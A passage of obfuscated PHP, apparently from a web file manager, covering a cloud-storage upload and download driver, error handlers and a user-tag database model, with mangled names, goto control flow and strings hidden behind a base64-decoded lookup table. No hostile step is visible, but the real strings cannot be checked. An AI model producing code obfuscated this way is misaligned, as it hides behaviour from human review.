$this->recursionAllFiles($cÕî“ğŠˆï, $AÌÖòÓ¨); return $AÌÖòÓ¨; } public function canRead($C¦šÊÈ‡²ã) { return $this->exist($C¦šÊÈ‡²ã) ? !0 : !1; } public function canWrite($D’¥ÔÇô£) { return $this->exist($D’¥ÔÇô£) ? !0 : !1; } public function getContent($b ƒ†¡±) { return $this->fileSubstr($b ƒ†¡±, 0, -1); } public function setContent($dò˜Ï´ÇÊ‡, $fšâ¼ëæ¤§ = '') { $càİñ¹±˜ø =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$fšâ¼ëæ¤§) { $b»î×¼îè = $this->ussRequest($dò˜Ï´ÇÊ‡, $càİñ¹±˜ø[212]); return $b»î×¼îè[$càİñ¹±˜ø[1036]]; } $Cö¼œå¡ñ– = $this->tempFile($this->pathThis($dò˜Ï´ÇÊ‡)); file_put_contents($Cö¼œå¡ñ–, $fšâ¼ëæ¤§); if ($this->upload($dò˜Ï´ÇÊ‡, $Cö¼œå¡ñ–)) { $this->tempFileRemve($Cö¼œå¡ñ–); return !0; } return !1; } public function fileSubstr($f‘ÕêÛ»Ï , $E¦Éº¸ªÇŞ, $côÊÏçš×§) { $e¥Õ­ø¸¶œ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!($cœÉì ¾‹ù = $this->link($f‘ÕêÛ»Ï ))) { return !1; } $eï›ĞŞÜæ = !1; if ($côÊÏçš×§ > 0) { $e–õíˆæ›õ = $E¦Éº¸ªÇŞ + $côÊÏçš×§ - 1; $eï›ĞŞÜæ = array($e¥Õ­ø¸¶œ[1224] . $E¦Éº¸ªÇŞ . $e¥Õ­ø¸¶œ[412] . $e–õíˆæ›õ); } $cÉÃ…ïÏ¼† = url_request($cœÉì ¾‹ù, $e¥Õ­ø¸¶œ[216], !1, $eï›ĞŞÜæ); return $cÉÃ…ïÏ¼†[$e¥Õ­ø¸¶œ[690]] ? $cÉÃ…ïÏ¼†[$e¥Õ­ø¸¶œ[1038]] : !1; } public function upload($Dà’‹Ú¿ ÷, $Dî¾†öæŞ®, $AŸÀå‚Æ = false, $a‹…ó†÷§Í = REPEAT_REPLACE) { goto BõÀº“š’; EôÇğïóå: if (!$BŸÆŒ±Çø°[$f–Ú­“’Ûœ[1036]]) { return !1; } $eÄÚ¦§å©ö = $BŸÆŒ±Çø°[$f–Ú­“’Ûœ[1038]]; $e¡åÏŒ› = 0; goto CßÅÕÎ¤Êñ; B¢ß£–›…: do { $E ãÇ¾±çŒ = $eÄÚ¦§å©ö[$f–Ú­“’Ûœ[1272]]; fseek($fİ‹“ªÊ’º, $e¡åÏŒ›); $EÃ¢ÜÄÁ– = fread($fİ‹“ªÊ’º, $E ãÇ¾±çŒ); $a¾ÎÚ¸‹™ = 0; do { $a¾ÎÚ¸‹™++; $eÄÚ¦§å©ö = $this->uploadPart($Dà’‹Ú¿ ÷, $eÄÚ¦§å©ö, $EÃ¢ÜÄÁ–); } while (!$eÄÚ¦§å©ö && $a¾ÎÚ¸‹™ < 3); if (!$eÄÚ¦§å©ö) { return !1; } $a»ñ„¤’×È = $eÄÚ¦§å©ö[$f–Ú­“’Ûœ[1271]]; $e¡åÏŒ› += $E ãÇ¾±çŒ; } while ($a»ñ„¤’×È != -1); fclose($fİ‹“ªÊ’º); $B™¿²Š×¿Ä = array($f–Ú­“’Ûœ[1273], $f–Ú­“’Ûœ[1274] . $eÄÚ¦§å©ö[$f–Ú­“’Ûœ[1275]], $f–Ú­“’Ûœ[1269]); goto CÒ˜¾·Ä¼; CÒ˜¾·Ä¼: $BŸÆŒ±Çø° = $this->ussRequest($Dà’‹Ú¿ ÷, $f–Ú­“’Ûœ[214], !1, $B™¿²Š×¿Ä); return $BŸÆŒ±Çø°[$f–Ú­“’Ûœ[1036]] ? $this->getPathOuter($A”ÆÅ¶‚Ì) : !1; goto CĞ»öã–´; BõÀº“š’: $f–Ú­“’Ûœ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $f†Ò¥ŠÓ = IO::size($Dî¾†öæŞ®); if ($f†Ò¥ŠÓ <= 1024 * 1024 * 200) { $BÌ³¦ïøß‹ = array($f–Ú­“’Ûœ[1266] . $Dî¾†öæŞ®); $BŸÆŒ±Çø° = $this->ussRequest($Dà’‹Ú¿ ÷, $f–Ú­“’Ûœ[214], $BÌ³¦ïøß‹); return $BŸÆŒ±Çø°[$f–Ú­“’Ûœ[1036]] ? $this->getPathOuter($Dà’‹Ú¿ ÷) : !1; } goto F£Ø°œÀæä; F£Ø°œÀæä: $eÆï‡ÛéÌ§ = 1024 * 1024 * 10; $B™¿²Š×¿Ä = array($f–Ú­“’Ûœ[1267], $f–Ú­“’Ûœ[1268] . $f†Ò¥ŠÓ, $f–Ú­“’Ûœ[1269], $f–Ú­“’Ûœ[1270] . $eÆï‡ÛéÌ§); $BŸÆŒ±Çø° = $this->ussRequest($Dà’‹Ú¿ ÷, $f–Ú­“’Ûœ[214], !1, $B™¿²Š×¿Ä); goto EôÇğïóå; CßÅÕÎ¤Êñ: $a»ñ„¤’×È = $eÄÚ¦§å©ö[$f–Ú­“’Ûœ[1271]]; $fİ‹“ªÊ’º = fopen($Dî¾†öæŞ®, $f–Ú­“’Ûœ[1174]); if (!$fİ‹“ªÊ’º) { return !1; } goto B¢ß£–›…; CĞ»öã–´: } private function uploadPart($aÚ«ğ’„†, $CÏ§ÕçÄÑ‹, &$F¸§˜„´Ğ) { $A£Å‡ô¿Ùõ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $d§ŒÁÇ„¥ = array($A£Å‡ô¿Ùõ[1276], $A£Å‡ô¿Ùõ[1274] . $CÏ§ÕçÄÑ‹[$A£Å‡ô¿Ùõ[1275]], $A£Å‡ô¿Ùõ[1277] . $CÏ§ÕçÄÑ‹[$A£Å‡ô¿Ùõ[1271]], $A£Å‡ô¿Ùõ[138] . $CÏ§ÕçÄÑ‹[$A£Å‡ô¿Ùõ[1272]]); $eàƒ‹©šÎ = $this->ussRequest($aÚ«ğ’„†, $A£Å‡ô¿Ùõ[214], $F¸§˜„´Ğ, $d§ŒÁÇ„¥); return !$eàƒ‹©šÎ[$A£Å‡ô¿Ùõ[1036]] ? $eàƒ‹©šÎ[$A£Å‡ô¿Ùõ[1036]] : $eàƒ‹©šÎ[$A£Å‡ô¿Ùõ[1038]]; } public function uploadFormData($F‡”«´†¸†, $b¡åŒÂ ƒ¶ = 3600) { return $this->uploadPolicy($F‡”«´†¸†, $b¡åŒÂ ƒ¶); } public function multiUploadFormData($cğéß‘‚¼š, $Dù“òùËˆ = 3600) { $E“óâÌ°‰† =& $_SERVER[´Ù×Íå‘ÄõÛ]; $DÚ¤ø°˜–ğ = (int) $GLOBALS[$E“óâÌ°‰†[7]][$E“óâÌ°‰†[77]]; return $this->uploadPolicy($cğéß‘‚¼š, $Dù“òùËˆ, $DÚ¤ø°˜–ğ); } private function uploadPolicy($f¨£¯õ·, $a™‰ÙÁ¶’÷ = 3600, $Dá’¯–« = 0) { goto EÂ‹†ÊÏƒ; b‰ĞÑîéĞ‘: $f¾Ù§‡—•¥ = base64_encode(hash_hmac($B§‘»ªŒŒî[1248], "\x50\x4f\x53\124\x26{$fœ«¿ãîàÛ}\x26{$e™‘ßõè±ã}\46{$b¿åÇÚÒ—¦}", md5("{$this->userpass}"), !0)); $a´ Ğƒ¶ÓÓ = array($B§‘»ªŒŒî[1116] => $b¿åÇÚÒ—¦, $B§‘»ªŒŒî[1282] => "\x55\x50\x59\x55\116\40{$this->username}\72{$f¾Ù§‡—•¥}", $B§‘»ªŒŒî[169] => $this->endpoint . $fœ«¿ãîàÛ); return $a´ Ğƒ¶ÓÓ; goto aŞÎ¶­ĞÚù; B¦•ÂãÂôˆ: $a®Õóƒ‘‘Ÿ = array($B§‘»ªŒŒî[1278] => $this->bucket, $B§‘»ªŒŒî[1279] => $f¨£¯õ·, $B§‘»ªŒŒî[1280] => time() + $a™‰ÙÁ¶’÷, $B§‘»ªŒŒî[1281] => $e™‘ßõè±ã); if ($Dá’¯–«) { $a®Õóƒ‘‘Ÿ[$B§‘»ªŒŒî[1195]] = $Dá’¯–«; } $b¿åÇÚÒ—¦ = base64_encode(json_encode($a®Õóƒ‘‘Ÿ)); goto b‰ĞÑîéĞ‘; EÂ‹†ÊÏƒ: $B§‘»ªŒŒî =& $_SERVER[´Ù×Íå‘ÄõÛ]; $fœ«¿ãîàÛ = $B§‘»ªŒŒî[8] . $this->bucket; $e™‘ßõè±ã = gmdate($B§‘»ªŒŒî[1209]); goto B¦•ÂãÂôˆ; aŞÎ¶­ĞÚù: } public function download($f ¸‰İƒ™º, $DÉ¾ÚÅ»‡ã) { goto fŒïÆ¢×Õ; fŒïÆ¢×Õ: $c¨ë¡Å‡ôì = IO::getPathInner(IO::mkfile($DÉ¾ÚÅ»‡ã)); if (!($cñ÷’Ê­„ = $this->link($f ¸‰İƒ™º))) { return !1; } $bˆ°¶Í•á­ = 0; goto Dã£¦³Ï®¨; Dã£¦³Ï®¨: $A’‘Š¯Ò = 1024 * 200; $DÌëé’Şä = fopen($c¨ë¡Å‡ôì, $_SERVER[´Ù×Íå‘ÄõÛ][1230]); while (!0) { $e»å”Óä…® = $this->fileSubstr($f ¸‰İƒ™º, $bˆ°¶Í•á­, $A’‘Š¯Ò); if ($e»å”Óä…® === !1) { return !1; } fwrite($DÌëé’Şä, $e»å”Óä…®); $bˆ°¶Í•á­ += $A’‘Š¯Ò; if (strlen($e»å”Óä…®) < $A’‘Š¯Ò) { break; } } goto AÑ´Ş—ÓÜ×; AÑ´Ş—ÓÜ×: fclose($DÌëé’Şä); return $DÉ¾ÚÅ»‡ã; goto A¼ƒ—ñŠÚ‘; A¼ƒ—ñŠÚ‘: } public function link($eÌªŒéøÄ®, $BÒÃ¢–±Ñà = array()) { $cƒÔ½œÒ©ƒ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $eÌªŒéøÄ® = trim($eÌªŒéøÄ®, $cƒÔ½œÒ©ƒ[8]); if (!empty($this->token)) { $dİÅ†©íŞß = strtotime(date($cƒÔ½œÒ©ƒ[1283])); $cÒİ¹ÂØ³ = substr(md5($this->token . $cƒÔ½œÒ©ƒ[272] . $dİÅ†©íŞß . $cƒÔ½œÒ©ƒ[1284] . $eÌªŒéøÄ®), 12, 8) . $dİÅ†©íŞß; $BÒÃ¢–±Ñà[] = $cƒÔ½œÒ©ƒ[1285] . $cÒİ¹ÂØ³; } $aÒß…ô¤™ = !empty($BÒÃ¢–±Ñà) ? $cƒÔ½œÒ©ƒ[69] . implode($cƒÔ½œÒ©ƒ[272], $BÒÃ¢–±Ñà) : $cƒÔ½œÒ©ƒ[33]; return $this->getHost() . $cƒÔ½œÒ©ƒ[8] . $eÌªŒéøÄ® . $aÒß…ô¤™; } public function fileOut($dÖšáİ·ˆ¼, $d»¤…®­È¤ = false, $a‹ë´˜½ó = false, $C‰í…ª¥¼Ê = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($dÖšáİ·ˆ¼, $d»¤…®­È¤, $a‹ë´˜½ó, $C‰í…ª¥¼Ê); } if (!$a‹ë´˜½ó) { $a‹ë´˜½ó = $this->pathThis($dÖšáİ·ˆ¼); } $EŒóŸ³† = $d»¤…®­È¤ ? array($_SERVER[´Ù×Íå‘ÄõÛ][1286] . rawurlencode($a‹ë´˜½ó)) : array(); $C”×óµ´Ø… = $this->link($dÖšáİ·ˆ¼, $EŒóŸ³†); $this->fileOutLink($C”×óµ´Ø…); } public function fileOutServer($DóäÅ©”¿Ê, $eª Á„¯…¡ = false, $cî©µ¦÷âø = false, $EªêÔˆŞ¤ = '') { parent::fileOut($DóäÅ©”¿Ê, $eª Á„¯…¡, $cî©µ¦÷âø, $EªêÔˆŞ¤); } public function fileOutImage($FÊİÄˆ½, $bã¹†µÅğÂ = 250) { $f³Õàİ‚ù = $this->link($FÊİÄˆ½ . $_SERVER[´Ù×Íå‘ÄõÛ][1287] . $bã¹†µÅğÂ); $this->fileOutLink($f³Õàİ‚ù); } public function fileOutImageServer($eá¼¡‘Ê††, $BÃè»®Œ = 250) { parent::fileOutImage($eá¼¡‘Ê††, $BÃè»®Œ); } public function hashMd5($EÓÒ›ğ‚”è) { $B´î½Àôê‚ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $B ˜›×ãëš = $this->objectMeta($EÓÒ›ğ‚”è); return isset($B ˜›×ãëš[$B´î½Àôê‚[196]]) ? $B ˜›×ãëš[$B´î½Àôê‚[196]] : !1; } public function size($E‘¸“ÙÑ¡Ã) { $fïÁ‘Úá†İ = $this->objectMeta($E‘¸“ÙÑ¡Ã); return $fïÁ‘Úá†İ ? $fïÁ‘Úá†İ[$_SERVER[´Ù×Íå‘ÄõÛ][77]] : 0; } public function info($Eª©¬Í¾ì ) { if ($this->isFolder($Eª©¬Í¾ì )) { return $this->folderInfo($Eª©¬Í¾ì ); } else { if ($this->isFile($Eª©¬Í¾ì )) { return $this->fileInfo($Eª©¬Í¾ì ); } } return !1; } public function exist($Eêô™¼å˜´) { return $this->isFile($Eêô™¼å˜´) || $this->isFolder($Eêô™¼å˜´); } public function isFile($bßá†¤¾„İ) { return !$this->isFolder($bßá†¤¾„İ) && $this->objectMeta($bßá†¤¾„İ); } public function isFolder($cƒÜ´‘­ÃŒ) { return $this->cacheMethod($_SERVER[´Ù×Íå‘ÄõÛ][223], $cƒÜ´‘­ÃŒ); } protected function objectMeta($Fó¤õ õÍ®) { return $this->cacheMethod($_SERVER[´Ù×Íå‘ÄõÛ][224], $Fó¤õ õÍ®); } protected function _objectMeta($Eçß¯«·Û) { goto f”»‹¸Üš§; EĞËòåôäì: $CµÛòÄ²¸š = array($dÜŒ’¢¬ŠÕ[28] => get_path_this($Eçß¯«·Û), $dÜŒ’¢¬ŠÕ[29] => isset($fîéñê¦¶¡[$dÜŒ’¢¬ŠÕ[1289]]) ? $fîéñê¦¶¡[$dÜŒ’¢¬ŠÕ[1289]] : null, $dÜŒ’¢¬ŠÕ[77] => isset($fîéñê¦¶¡[$dÜŒ’¢¬ŠÕ[1290]]) ? $fîéñê¦¶¡[$dÜŒ’¢¬ŠÕ[1290]] : null, $dÜŒ’¢¬ŠÕ[196] => isset($fîéñê¦¶¡[$dÜŒ’¢¬ŠÕ[1291]]) ? $fîéñê¦¶¡[$dÜŒ’¢¬ŠÕ[1291]] : null, $dÜŒ’¢¬ŠÕ[1259] => isset($fîéñê¦¶¡[$dÜŒ’¢¬ŠÕ[1292]]) ? $fîéñê¦¶¡[$dÜŒ’¢¬ŠÕ[1292]] : null); $CµÛòÄ²¸š[$dÜŒ’¢¬ŠÕ[1260]] = isset($fîéñê¦¶¡[$dÜŒ’¢¬ŠÕ[1293]]) ? strtotime($fîéñê¦¶¡[$dÜŒ’¢¬ŠÕ[1293]]) : $CµÛòÄ²¸š[$dÜŒ’¢¬ŠÕ[1259]]; return $CµÛòÄ²¸š; goto EµšÇ¶´ß§; f”»‹¸Üš§: $dÜŒ’¢¬ŠÕ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if ($Eçß¯«·Û == $dÜŒ’¢¬ŠÕ[33] || $Eçß¯«·Û == $dÜŒ’¢¬ŠÕ[8]) { return array(); } $BÜ ÓÌ‰ã = $this->ussRequest($Eçß¯«·Û, $dÜŒ’¢¬ŠÕ[1288]); goto a‚¥çÒÏØÇ; a‚¥çÒÏØÇ: if (!$BÜ ÓÌ‰ã[$dÜŒ’¢¬ŠÕ[1036]]) { return null; } $fîéñê¦¶¡ = isset($BÜ ÓÌ‰ã[$dÜŒ’¢¬ŠÕ[1038]]) ? $BÜ ÓÌ‰ã[$dÜŒ’¢¬ŠÕ[1038]] : array(); if (!isset($fîéñê¦¶¡[$dÜŒ’¢¬ŠÕ[1289]])) { return null; } goto EĞËòåôäì; EµšÇ¶´ß§: } protected function _isFolder($eÈøù•Ë¯Á) { $fí»Ô©ì¦ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if ($eÈøù•Ë¯Á == $fí»Ô©ì¦[33] || $eÈøù•Ë¯Á == $fí»Ô©ì¦[8]) { return !0; } $FíÈ¸™ÃÓ = $this->objectMeta($eÈøù•Ë¯Á); return isset($FíÈ¸™ÃÓ[$fí»Ô©ì¦[29]]) && $FíÈ¸™ÃÓ[$fí»Ô©ì¦[29]] == $fí»Ô©ì¦[76] ? !0 : !1; } } goto E¿¢Ùïµ¦ƒ; fĞãÑ®³º³: register_shutdown_function($_SERVER[ïÚûó†Îá][32]); set_error_handler($_SERVER[ïÚûó†Îá][46], $a¬§ëâ°¦‰); if (function_exists($_SERVER[ïÚûó†Îá][47])) { set_exception_handler($_SERVER[ïÚûó†Îá][48]); } goto B‡‹ÉË”¦ª; AĞÌÇ¤äê™: function beforeShutdownError($BŸ¥ïÍ‡õ§ = false, $cØ·ó±ÏË = '', $c ìõ†ÒĞÜ = '', $Eä¦Œã‰­¶ = 0) { $f…Ûä‘˜² =& $_SERVER[ïÚûó†Îá]; switch ($BŸ¥ïÍ‡õ§) { case E_PARSE: case E_ERROR: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: $bÅºÂ Åæ£ = $f…Ûä‘˜²[35]; break; case E_WARNING: case E_USER_WARNING: case E_COMPILE_WARNING: case E_RECOVERABLE_ERROR: $bÅºÂ Åæ£ = $f…Ûä‘˜²[36]; break; case E_STRICT: $bÅºÂ Åæ£ = $f…Ûä‘˜²[37]; break; case E_NOTICE: case E_USER_NOTICE: $bÅºÂ Åæ£ = $f…Ûä‘˜²[38]; break; case E_DEPRECATED: case E_USER_DEPRECATED: $bÅºÂ Åæ£ = $f…Ûä‘˜²[39]; break; default: break; } if (!$bÅºÂ Åæ£ || $bÅºÂ Åæ£ == $f…Ûä‘˜²[38] || $bÅºÂ Åæ£ == $f…Ûä‘˜²[39]) { return; } $c ìõ†ÒĞÜ = $f…Ûä‘˜²[4] . str_replace($_SERVER[$f…Ûä‘˜²[33]], $f…Ûä‘˜²[16], $c ìõ†ÒĞÜ); $FÄ”ö­¬‹Ê = $bÅºÂ Åæ£ . $f…Ûä‘˜²[40] . $cØ·ó±ÏË . $f…Ûä‘˜²[40] . $c ìõ†ÒĞÜ . $f…Ûä‘˜²[40] . $Eä¦Œã‰­¶; write_log($FÄ”ö­¬‹Ê . $f…Ûä‘˜²[41] . get_caller_msg(1), $f…Ûä‘˜²[15]); } $_SERVER[$_SERVER[ïÚûó†Îá][42]] = $_SERVER[$_SERVER[ïÚûó†Îá][33]] . $_SERVER[ïÚûó†Îá][43]; $bß¾á†¡ó¦ = strrev(base64_decode($_SERVER[ïÚûó†Îá][44])); goto F›äèÂ¤‚; f†¦Ş Í½ö: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\145\162\137\146\141\166"; protected function cacheFunctionAlias($e˜¯—Ê—áõ) { $Cšà ÕŠ¯Ë =& $_SERVER[´Ù×Íå‘ÄõÛ]; return array($Cšà ÕŠ¯Ë[2208] => array(USER_ID, $Cšà ÕŠ¯Ë[2209])); } protected function listData() { $Eõ–¥‚å‹Ã =& $_SERVER[´Ù×Íå‘ÄõÛ]; $c‰­ƒÍ‰İ… = array($Eõ–¥‚å‹Ã[1432] => USER_ID, $Eõ–¥‚å‹Ã[436] => array($Eõ–¥‚å‹Ã[2212], 0)); $DºÔ„Õ¬æ” = $Eõ–¥‚å‹Ã[2214]; $dñ‡À‡ïšĞ = $this->field($DºÔ„Õ¬æ”)->where($c‰­ƒÍ‰İ…)->order($Eõ–¥‚å‹Ã[2215])->select(); return $dñ‡À‡ïšĞ ? $dñ‡À‡ïšĞ : array(); } protected function listByTag($dãÛ›µ‰÷) { } protected function addToTag($béŸ°©, $c¢íŠËç‘Õ) { $Eé¦è“‰˜ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!Model($Eé¦è“‰˜[2338])->listData($c¢íŠËç‘Õ) || !Model($Eé¦è“‰˜[753])->pathInfo($béŸ°©)) { return !1; } $CÃ‚ƒÚæÌ¤ = array($Eé¦è“‰˜[1432] => USER_ID, $Eé¦è“‰˜[436] => $c¢íŠËç‘Õ, $Eé¦è“‰˜[387] => $béŸ°©, $Eé¦è“‰˜[388] => $Eé¦è“‰˜[382], $Eé¦è“‰˜[386] => $Eé¦è“‰˜[33], $Eé¦è“‰˜[2116] => 0); if ($this->where($CÃ‚ƒÚæÌ¤)->find()) { return !1; } return $this->add($CÃ‚ƒÚæÌ¤); } protected function removeFromTag($a§‘ˆ—ÎÑ, $Eìîƒ‘òğè) { $FÅİÉÀŠšİ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!Model($FÅİÉÀŠšİ[2338])->listData($Eìîƒ‘òğè)) { return !1; } if (is_array($a§‘ˆ—ÎÑ)) { $a§‘ˆ—ÎÑ = array($FÅİÉÀŠšİ[7], $a§‘ˆ—ÎÑ); } $Eº¸Œ‹îéä = array($FÅİÉÀŠšİ[1432] => USER_ID, $FÅİÉÀŠšİ[436] => $Eìîƒ‘òğè, $FÅİÉÀŠšİ[388] => $FÅİÉÀŠšİ[382], $FÅİÉÀŠšİ[387] => $a§‘ˆ—ÎÑ); return $this->where($Eº¸Œ‹îéä)->delete(); } protected function removeByTag($fŸæÔàÅ“¦) { $f¥ÆÁ‰Ú‘ğ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$fŸæÔàÅ“¦) { return !1; } $C‡ò»¯·ÍÓ = array($f¥ÆÁ‰Ú‘ğ[1432] => USER_ID, $f¥ÆÁ‰Ú‘ğ[436] => $fŸæÔàÅ“¦); return $this->where($C‡ò»¯·ÍÓ)->delete(); } protected function removeBySource($cŸŠ¨°æáó) { $bºº²Ñìƒ¥ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (is_array($cŸŠ¨°æáó)) { $cŸŠ¨°æáó = array($bºº²Ñìƒ¥[7], $cŸŠ¨°æáó); } $Eµ¾‹ƒÃö = array($bºº²Ñìƒ¥[1432] => USER_ID, $bºº²Ñìƒ¥[387] => $cŸŠ¨°æáó, $bºº²Ñìƒ¥[436] => array($bºº²Ñìƒ¥[931], 0)); return $this->where($Eµ¾‹ƒÃö)->delete(); } }